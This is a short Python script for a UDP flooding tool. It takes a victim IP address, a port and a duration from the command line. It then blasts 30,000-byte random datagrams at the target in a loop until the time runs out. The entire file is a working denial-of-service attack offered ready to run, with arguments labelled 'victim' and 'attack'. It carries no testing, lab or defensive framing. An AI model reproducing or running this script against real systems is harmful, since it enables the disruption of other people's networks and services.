import socket
import argparse
import sys
import time
import os

def flood(victim, vport, duration):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = os.urandom(30000)
        timeout = time.time() + duration
        sent = 0

        while True:
            if time.time() > timeout:
                break
            else:
                pass
            client.sendto(bytes, (victim,vport))
            sent += 1
            print(f" Sent {sent} packets to {victim} on port {vport}")
        client.close()
    except KeyboardInterrupt:
        print("\nTerminating due to keyboard interrupt.")
        sys.exit()
    except socket.error as e:
        print(f"Socket error: {e}")
        sys.exit()
    except Exception as e:
        print(f"An error occurred: {e}")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description="Simple UDP Flooding Tool",add_help=True,formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("-v", "--victim", type=str, required=True, help="IP address of the victim")
    parser.add_argument("-p","--port", type=int, required=True, help="Port number of the victim")
    parser.add_argument("-d","--duration", type=int, required=True, help="Duration of the attack in seconds")

    args = parser.parse_args()
    flood(args.victim, args.port, args.duration)

if __name__ == "__main__":
    main()
